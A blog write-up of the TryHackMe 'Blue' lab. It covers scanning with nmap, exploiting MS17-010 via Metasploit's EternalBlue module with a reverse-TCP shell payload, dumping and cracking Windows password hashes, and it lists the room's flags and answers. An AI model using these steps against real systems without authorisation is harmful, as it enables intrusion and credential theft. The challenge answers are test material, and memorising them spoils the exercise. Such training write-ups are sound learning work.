---
title: "Exploitation Basics: Blue (TryHackMe)"
datePublished: Thu Oct 31 2024 21:05:18 GMT+0000 (Coordinated Universal Time)
cuid: cm2xso8cx000c09l1dpky0gp7
slug: exploitation-basics-blue-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1730408256694/f534bba9-e8c4-49dc-9862-896933f823ec.png
tags: windows, tryhackme, write-up, exploitation

---

In this article, I will write a write-up for Exploitation Basics: Blue that covers Recons, Gain Access, Escalate, Cracking and Finding Flags.

1. Scan the machine. (If you are unsure how to tackle this, I recommend checking out the [Nmap](https://tryhackme.com/room/furthernmap) room)
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730408597240/676e96fd-d34a-4282-a1d7-8fde8ecb5601.png align="center")
    
2. How many ports are open with a port number under 1000? `3`
    

the hint of previous question was to run `nmap -sV -vv --script vuln TARGET_IP` it shows open ports and you’ll count the ones below 1000 3. What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067) `ms17-010`

the 445/tcp…Microsoft windows 7 reflects the MS17-010, you can read more details about the [Microsoft Security Bulletin MS17-010 - Critical](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730408635084/e65f451b-1eec-4e48-b712-77a5c73cc7d1.png align="center")

4. Start [Metasploit](https://tryhackme.com/module/metasploit)
    
5. Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........) `exploit/windows/smb/ms17_010_eternalblue`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730408557762/facbe250-65fc-4d08-b421-720475a302d6.png align="center")
    
6. Show options and set the one required value. What is the name of this value? (All caps for submission) `RHOSTS`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730408532330/a692e09a-c9c0-496a-9dc5-7326b16a911d.png align="center")
    
7. Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:`set payload windows/x64/shell/reverse_tcp`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730408493765/4026da13-0f1e-4244-b14c-ea6f7ca1dde8.png align="center")
    
8. With that done, run the exploit!
    
9. Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.
    

Dump the non-default user's password and crack it! Answer the questions below 10. Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? `Jon`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730408463499/9ed96955-5671-4d37-973e-548b2d74bc5d.png align="center")

11. Copy this password hash to a file and research how to crack it. What is the cracked password? `alqfna22`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730408411013/1ef16dce-0571-4005-9a60-6f96fa2da811.png align="center")
    
12. Flag1? *This flag can be found at the system root.* `flag{access_the_machine}`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730408436628/aafd18c9-f6a3-4344-8379-62d8987bd80b.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730408375081/b371d575-0824-4b04-8a03-470f775090f9.png align="center")
    
13. Flag2? *This flag can be found at the location where passwords are stored within Windows.* Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen. `flag{sam_database_elevated_access}`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730408354034/775c189e-c490-4008-8c66-0a5644570050.png align="center")
    
14. flag3? *This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.* `flag{admin_documents_can_be_valuable}`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1730408328183/00d0e567-ebce-4bb0-a487-4b7da0a89431.png align="center")
    

Thank you for reading my article. Please leave any questions or comments on improving my learning journey and the THM challenges. We can also connect more on [**LinkedIn**](https://www.linkedin.com/in/sharon-jebitok) or [**X**](https://x.com/SharonJebitok)**.**